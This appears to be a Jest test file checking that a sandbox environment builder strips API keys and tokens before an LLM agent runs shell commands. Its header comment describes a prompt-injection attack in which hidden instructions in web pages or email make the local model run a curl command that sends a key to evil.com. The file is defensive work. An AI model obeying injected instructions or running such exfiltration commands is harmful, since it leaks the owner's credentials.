/**
 * C-48 leg 4: the sandbox process must hold no credentials.
 *
 * Attack: untrusted content (web page, email, PDF) carries a hidden
 * instruction; the 31-35B local model obeys it and runs a shell command.
 * Previously that shell inherited the whole Next.js env — every key in .env
 * — so one `curl "evil.com?k=$BRAVE_API_KEY"` exfiltrated them all.
 */
import { buildSandboxEnv } from '../lib/sandbox-env';

describe('buildSandboxEnv — attack blocked', () => {
  const saved = { ...process.env };
  afterEach(() => {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  });

  it('drops every real key from this project .env', () => {
    // The actual names from nextjs-app/.env — the ones an injection would target.
    process.env.BRAVE_API_KEY = 'brave-secret';
    process.env.OPENWEATHER_API_KEY = 'weather-secret';
    process.env.MUSIC_ASSISTANT_TOKEN = 'music-secret';
    const env = buildSandboxEnv();
    expect(env.BRAVE_API_KEY).toBeUndefined();
    expect(env.OPENWEATHER_API_KEY).toBeUndefined();
    expect(env.MUSIC_ASSISTANT_TOKEN).toBeUndefined();
    // And no value of any dropped secret leaks under another name.
    expect(Object.values(env)).not.toContain('brave-secret');
    expect(Object.values(env)).not.toContain('music-secret');
  });

  it('drops secret-shaped names generically, not just known ones', () => {
    process.env.SOME_NEW_API_KEY = 'x';
    process.env.GITHUB_TOKEN = 'x';
    process.env.DB_PASSWORD = 'x';
    process.env.STRIPE_SECRET = 'x';
    process.env.SESSION_COOKIE = 'x';
    process.env.SLACK_WEBHOOK = 'x';
    process.env.CLIENT_CREDENTIAL = 'x';
    const env = buildSandboxEnv();
    for (const name of ['SOME_NEW_API_KEY', 'GITHUB_TOKEN', 'DB_PASSWORD',
      'STRIPE_SECRET', 'SESSION_COOKIE', 'SLACK_WEBHOOK', 'CLIENT_CREDENTIAL']) {
      expect(env[name]).toBeUndefined();
    }
  });

  it('drops unknown non-secret vars too (deny by default)', () => {
    process.env.SOME_RANDOM_INTERNAL_URL = 'http://internal';
    expect(buildSandboxEnv().SOME_RANDOM_INTERNAL_URL).toBeUndefined();
  });
});

describe('buildSandboxEnv — normal use still works', () => {
  it('keeps the basics a shell and python need', () => {
    const env = buildSandboxEnv();
    expect(env.PATH).toBe(process.env.PATH);
    expect(env.HOME).toBe(process.env.HOME);
  });

  it('keeps the ML toolchain vars the owner runs training with', () => {
    const saved = { ...process.env };
    process.env.CUDA_VISIBLE_DEVICES = '0';
    process.env.LD_LIBRARY_PATH = '/usr/local/cuda/lib64';
    process.env.PYTORCH_CUDA_ALLOC_CONF = 'max_split_size_mb:128';
    process.env.OMP_NUM_THREADS = '8';
    process.env.VIRTUAL_ENV = '/home/x/proj/venv';
    const env = buildSandboxEnv();
    expect(env.CUDA_VISIBLE_DEVICES).toBe('0');
    expect(env.LD_LIBRARY_PATH).toBe('/usr/local/cuda/lib64');
    expect(env.PYTORCH_CUDA_ALLOC_CONF).toBe('max_split_size_mb:128');
    expect(env.OMP_NUM_THREADS).toBe('8');
    expect(env.VIRTUAL_ENV).toBe('/home/x/proj/venv');
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
  });

  it('applies caller-supplied extras verbatim', () => {
    expect(buildSandboxEnv({ PYTHONDONTWRITEBYTECODE: '1' }).PYTHONDONTWRITEBYTECODE).toBe('1');
  });

  it('honours the owner opt-in escape hatch', () => {
    const saved = { ...process.env };
    process.env.MY_LAB_ENDPOINT = 'http://lab';
    process.env.CHOOM_SANDBOX_ENV_EXTRA = 'MY_LAB_ENDPOINT';
    expect(buildSandboxEnv().MY_LAB_ENDPOINT).toBe('http://lab');
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  });

  it('opt-in cannot be used to smuggle a value the model chose', () => {
    // The escape hatch reads NAMES from the owner's env config; the model
    // never controls it. Sanity-check it only ever copies existing vars.
    const saved = { ...process.env };
    process.env.CHOOM_SANDBOX_ENV_EXTRA = 'DOES_NOT_EXIST';
    expect(buildSandboxEnv().DOES_NOT_EXIST).toBeUndefined();
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  });
});
